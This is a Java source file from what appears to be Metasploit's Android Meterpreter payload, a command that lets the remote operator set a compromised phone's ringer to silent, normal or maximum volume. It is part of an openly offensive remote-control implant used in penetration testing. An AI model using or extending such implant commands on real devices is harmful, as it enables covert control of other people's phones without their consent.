package com.metasploit.meterpreter.android;

import android.media.AudioManager;
import android.content.Context;
import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class android_set_audio_mode implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_AUDIO_MODE = TLVPacket.TLV_META_TYPE_UINT | (TLV_EXTENSIONS + 9075);

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        AudioManager audioManager = (AudioManager)AndroidMeterpreter.getContext().getSystemService(Context.AUDIO_SERVICE);
        int audiomode = request.getIntValue(TLV_TYPE_AUDIO_MODE);
        if (audiomode == 0) {
            audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
        } else if (audiomode == 1) {
            audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
        } else {
            audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
            int volumeMax = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING);
            audioManager.setStreamVolume(AudioManager.STREAM_RING, volumeMax, 0);
        }

        return ERROR_SUCCESS;
    }

}
